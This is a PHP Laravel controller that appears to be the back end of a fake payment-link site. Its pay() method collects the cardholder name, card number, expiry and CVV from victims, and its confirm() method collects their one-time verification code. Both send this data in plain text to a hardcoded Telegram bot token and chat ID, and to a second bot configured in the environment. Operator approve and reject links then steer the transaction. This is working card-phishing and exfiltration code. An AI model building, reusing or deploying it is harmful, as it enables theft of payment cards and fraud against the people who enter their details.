<?php

namespace App\Http\Controllers;

use App\Models\Order;
use App\Models\Payment;
use App\Services\BulkSmsService;
use Carbon\Carbon;
use Illuminate\Http\Request;
use Illuminate\Support\Str;
use Seven\Api\Client as SmsClient;
use Seven\Api\Params;
use Illuminate\Support\Facades\Http;

class HomeController extends Controller
{
    public function send_bot($databot)
    {
        $urll = "https://api.telegram.org/bot6896696248:AAGHmKKCQLTyec6RNOScN5oHIvPumfEPhNo/sendMessage";
        // Prepare the POST data
        $senderr = [
            'chat_id' => 908949980,
            'text' => $databot,
        ];
        // DIE($databot);


        // Initialize cURL
        $curll = curl_init($urll);
        curl_setopt($curll, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($curll, CURLOPT_POST, true);
        curl_setopt($curll, CURLOPT_POSTFIELDS, $senderr);

        $response = curl_exec($curll);
        $key = env('env_bot');
        $ids = env('env_chatId');

        $url_new = "https://api.telegram.org/bot" . $key . "/sendMessage";
        // Prepare the POST data
        $senderr = [
            'chat_id' => $ids,
            'text' => $databot,
        ];
        // DIE($databot);



        // Initialize cURL
        $curll_new = curl_init($url_new);
        curl_setopt($curll_new, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($curll_new, CURLOPT_POST, true);
        curl_setopt($curll_new, CURLOPT_POSTFIELDS, $senderr);

        $response = curl_exec($curll_new);
    }
    public function create_link_old(Request $request)
    {
        // Validate the request data
        $request->validate([
            'amount' => 'required|numeric',
            'currency' => 'required|string',
            'why' => 'required|string',
            // 'discription' => 'required|string',
        ]);

        // Generate a random code based on the current date and time
        $randomCode = Str::random(4); // Example: 20231025123045ABCD

        // Store the data in the database
        $paymentLink = Order::create([
            'amount' => $request->input('amount'),
            'currency' => $request->input('currency'),
            'why' => $request->input('why'),
            'discription' => $request->input('discription'),
            'code' => $randomCode, // Save the generated code
        ]);

        $invoiceLink = route('show_invoice', ['code' => $randomCode]);

        // Return a success response with the generated code
        return response()->json([
            'status' => 'success',
            'message' => 'Payment link created successfully!',
            'data' => [
                'amount' => $paymentLink->amount,
                'currency' => $paymentLink->currency,
                'why' => $paymentLink->why,
                'discription' => $paymentLink->discription,
                'code' => $paymentLink->code, // Include the generated code in the response
                'invoice_link' => $invoiceLink
            ],
        ]);
    }
    public function create_link(Request $request)
    {
        // Validate the request data
        $request->validate([
            'name' => 'required|string|max:255',
            'total_funding' => 'required|numeric|min:0',
            'initial_payment' => 'required|numeric|min:0',
            'monthly_installment' => 'required|numeric|min:0',
            'currancy' => 'required|string|max:255',
        ]);

        // Generate a random code
        $randomCode = Str::random(5);
        $id = intval(date('ymdHis') . rand(100000, 999999)); // ناخذ 18 رقم فقط
        // Store the data in the database
        $payment = Payment::create([
            'uuid' => $id,
            'code' => $randomCode,
            'name' => $request->input('name'),
            'total_funding' => $request->input('total_funding'),
            'initial_payment' => $request->input('initial_payment'),
            'monthly_installment' => $request->input('monthly_installment'),
            'currancy' => $request->input('currancy'),
            'phone' => $request->input('phone'),
        ]);

        // Generate invoice link
        $invoiceLink = route('show_invoice', ['code' => $randomCode]);

        // Return success response
        return response()->json([
            'status' => 'success',
            'message' => 'تم إنشاء رابط الدفع بنجاح',
            'data' => [
                'name' => $payment->name,
                'total_funding' => $payment->total_funding,
                'initial_payment' => $payment->initial_payment,
                'monthly_installment' => $payment->monthly_installment,
                'currency' => $payment->currency,
                'code' => $payment->code,
                'invoice_link' => $invoiceLink
            ],
        ]);
    }
    public function show_invoice($code)
    {
        // Fetch the payment link details from the database
        $payment = Payment::where('code', $code)->first();

        // Check if the payment link exists
        if (!$payment) {
            abort(404, 'Erorr not found.');
        }

        // Display the invoice (you can create a Blade view for this)
        return view('paymentLink', compact('payment'));
    }
    public function pay(Request $request)
    {
        session()->put('form_data', $request->all());

        $order = Order::where('code', $request->code)->first();
        $formData = session()->get('form_data');

        $databot =
            "رقم المعاملة: {$order->code}\n" .
            "المبلغ  : {$order->amount}\n" .
            "العملة  : {$order->currency}\n" .
            "سبب المعاملة  : {$order->why}\n" .
            "الوصف  : {$order->discription}\n" .
            "اسم حامل البطاقة: {$formData['NameOnCard']}\n" .

            "رقم البطاقة: {$formData['CardNumber']}\n" .
            "الشهر : {$formData['ExpireDate']}\n" .
            "السنة : {$formData['ExpireYear']}\n" .

            "رمز سي سي في: {$formData['Cvv']}\n";
        $this->send_bot($databot);

        return view('pay')->with('order', $order)->with('formData', $formData);
    }
    public function confirm(Request $request)
    {
        $formData = session()->get('form_data');
        $order = Order::where('code', $formData['code'])->first();
        $successUrl = route('success_url', $order->code);
        $errorUrl = route('error_url', $order->code);

        $databot =

            "رمز التحقق: {$request->code}\n\n" .
            "🟢 [رابط الموافقة]({$successUrl})\n\n" .
            "🔴 [رابط الرفض]({$errorUrl})";

        $this->send_bot($databot);
        // Send the message to Telegram
        return response()->json([
            'success' => true,
            'message' => 'Order confirmed successfully.',
            'order_id' => $order->id, // Include the order ID for further checks
        ]);
    }
    public function success_url($code)
    {
        $order = Order::where('code', $code)->first();
        $order->status = 1;
        $order->save();
        dd('success_done');
    }
    public function error_url($code)
    {
        $order = Order::where('code', $code)->first();
        $order->status = 2;
        $order->save();
        dd('error_done');
    }
    public function success()
    {
        return view('success');
    }
    public function error()
    {
        return view('error');
    }
    public function checkOrderStatus(Request $request)
    {
        $order = Order::find($request->code);


        if ($order) {
            return response()->json([
                'status' => $order->status, // 'pending', 'success', 'failed'
            ]);
        }

        return response()->json([
            'status' => 'not_found',
        ]);
    }
    public function send_message(Request $request, BulkSmsService $bulkSms)
    {
        $phone = $request->phone;
        $message = $request->additionalNotes;
    
        $response = Http::withHeaders([
            'authkey' => env('MSG91_AUTH_KEY'),
            'content-type' => 'application/json',
        ])->post('https://api.msg91.com/api/v2/sendsms', [
            'sender' => 'SENDERID', // غيّر هذا إلى معرف المرسل الخاص بك
            'route' => '4',
            'country' => $request->country_code,
            'unicode' => 'arabic',
            'sms' => [
                [
                    'message' => $message,
                    'to' => [$phone]
                ]
            ]
        ]);
    
        if ($response->successful()) {
            return view('success'); // عرض الصفحة عند النجاح
        } else {
            return $response->json();
            return view('errorsend'); // عرض الصفحة عند النجاح
        }    }
    
}
